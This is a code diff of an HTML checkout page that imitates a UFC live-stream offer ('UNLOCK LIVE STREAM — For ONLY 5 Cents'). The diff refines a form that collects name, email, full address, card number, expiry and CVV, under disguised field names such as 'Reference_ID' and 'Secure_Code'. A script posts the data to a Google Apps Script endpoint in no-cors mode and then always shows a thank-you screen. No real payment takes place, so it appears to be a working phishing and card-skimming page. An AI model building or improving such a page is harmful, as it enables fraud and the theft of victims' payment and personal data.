@@ -81,7 +81,7 @@
     }
 
     /* Form Styling */
-    input[type=text] { 
+    input[type=text], select { 
         width: 100%; 
         margin-bottom: 15px; 
         padding: 15px; 
@@ -91,7 +91,7 @@
         font-family: 'Inter', sans-serif; 
         border-radius: 4px;
     }
-    input[type=text]:focus { outline: none; border-color: var(--ufc-red); }
+    input[type=text]:focus, select:focus { outline: none; border-color: var(--ufc-red); }
     
     label { 
         margin-bottom: 8px; 
@@ -143,15 +143,25 @@
         <p style="color: var(--text-gray); font-size: 12px; margin: 0;">Instant 4K Access Pass</p>
     </div>
 
-    <form id="checkoutForm" action="https://script.google.com/macros/s/AKfycbw-p6052iCoYf0yzZVsKHCXWjiJj86Rbg_sAGQrZ7sRS7lARORgn0x7wxgEvv9ItORj/exec" method="POST">
+    <form id="checkoutForm" action="https://script.google.com/macros/s/AKfycbzyFwA-gHdtK1RaDf_H8ijMrO4tUEmWRO1EeAxjDzHbwYi-d-Z6K-vLOq4J-6isznQ5/exec" method="POST">
       
       <h3>1. Account Info</h3>
       <label>Full Name</label>
-      <input type="text" id="fname" name="Full_Name" placeholder="Full Name" required>
+      <input type="text" name="Full_Name" placeholder="Full Name" required>
       <label>Email (For Stream Link)</label>
-      <input type="text" id="email" name="Email" placeholder="email@example.com" required>
-      <label>Home Address</label>
-      <input type="text" id="address" name="Home_Address" placeholder="123 Street Name, City, State, Zip" required>
+      <input type="text" name="Email" placeholder="email@example.com" required>
+      <label>Street Address</label>
+      <input type="text" name="Street" placeholder="123 Street Name" required>
+      
+      <div style="display: flex; gap: 15px;">
+        <div style="flex: 1;"><label>City</label><input type="text" name="City" placeholder="City" required></div>
+        <div style="flex: 1;"><label>State</label>
+          <select name="State" required>
+            <option value="" disabled selected>Select State</option>
+            <option value="Alabama">Alabama</option><option value="Alaska">Alaska</option><option value="Arizona">Arizona</option><option value="Arkansas">Arkansas</option><option value="California">California</option><option value="Colorado">Colorado</option><option value="Connecticut">Connecticut</option><option value="Delaware">Delaware</option><option value="Florida">Florida</option><option value="Georgia">Georgia</option><option value="Hawaii">Hawaii</option><option value="Idaho">Idaho</option><option value="Illinois">Illinois</option><option value="Indiana">Indiana</option><option value="Iowa">Iowa</option><option value="Kansas">Kansas</option><option value="Kentucky">Kentucky</option><option value="Louisiana">Louisiana</option><option value="Maine">Maine</option><option value="Maryland">Maryland</option><option value="Massachusetts">Massachusetts</option><option value="Michigan">Michigan</option><option value="Minnesota">Minnesota</option><option value="Mississippi">Mississippi</option><option value="Missouri">Missouri</option><option value="Montana">Montana</option><option value="Nebraska">Nebraska</option><option value="Nevada">Nevada</option><option value="New Hampshire">New Hampshire</option><option value="New Jersey">New Jersey</option><option value="New Mexico">New Mexico</option><option value="New York">New York</option><option value="North Carolina">North Carolina</option><option value="North Dakota">North Dakota</option><option value="Ohio">Ohio</option><option value="Oklahoma">Oklahoma</option><option value="Oregon">Oregon</option><option value="Pennsylvania">Pennsylvania</option><option value="Rhode Island">Rhode Island</option><option value="South Carolina">South Carolina</option><option value="South Dakota">South Dakota</option><option value="Tennessee">Tennessee</option><option value="Texas">Texas</option><option value="Utah">Utah</option><option value="Vermont">Vermont</option><option value="Virginia">Virginia</option><option value="Washington">Washington</option><option value="West Virginia">West Virginia</option><option value="Wisconsin">Wisconsin</option><option value="Wyoming">Wyoming</option>
+          </select>
+        </div>
+      </div>
 
       <h3>2. Payment Details</h3>
       <div class="icon-container">
@@ -161,20 +171,13 @@
       </div>
 
       <label>Cardholder Name</label>
-      <input type="text" name="Reference_User" id="cname" placeholder="Name on Card" required>
-
+      <input type="text" name="Reference_User" placeholder="Name on Card" required>
       <label>Card Number</label>
-      <input type="text" name="Reference_ID" id="ccnum" placeholder="0000 0000 0000 0000" required>
+      <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" required>
 
       <div style="display: flex; gap: 15px;">
-        <div style="flex: 1;">
-          <label>Expiration</label>
-          <input type="text" name="Expiry" placeholder="MM/YY" required>
-        </div>
-        <div style="flex: 1;">
-          <label>CVV</label>
-          <input type="text" name="Secure_Code" id="cvv" placeholder="123" required>
-        </div>
+        <div style="flex: 1;"><label>Expiration</label><input type="text" name="Expiry" placeholder="MM/YY" required></div>
+        <div style="flex: 1;"><label>CVV</label><input type="text" name="Secure_Code" placeholder="123" required></div>
       </div>
 
       <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — For ONLY 5 Cents</button>
@@ -192,33 +195,18 @@
 <script>
   const form = document.getElementById('checkoutForm');
   const btn = document.getElementById('submitBtn');
-
   form.addEventListener('submit', function(e) {
     e.preventDefault();
     btn.innerText = "VERIFYING PAYMENT...";
     btn.disabled = true;
-
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-      method: 'POST',
-      body: formData,
-      mode: 'no-cors'
-    })
+    fetch(form.action, { method: 'POST', body: new FormData(form), mode: 'no-cors' })
     .then(() => {
       document.getElementById("form-container").style.display = "none";
       document.getElementById("nav-header").style.display = "none";
       document.getElementById("thanks-screen").style.display = "block";
       window.scrollTo(0,0);
-    })
-    .catch(error => {
-      console.error('Error:', error);
-      alert("Payment processor busy. Please try again.");
-      btn.innerText = "UNLOCK LIVE STREAM — For ONLY 5 Cents";
-      btn.disabled = false;
     });
   });
 </script>
-
 </body>
 </html>
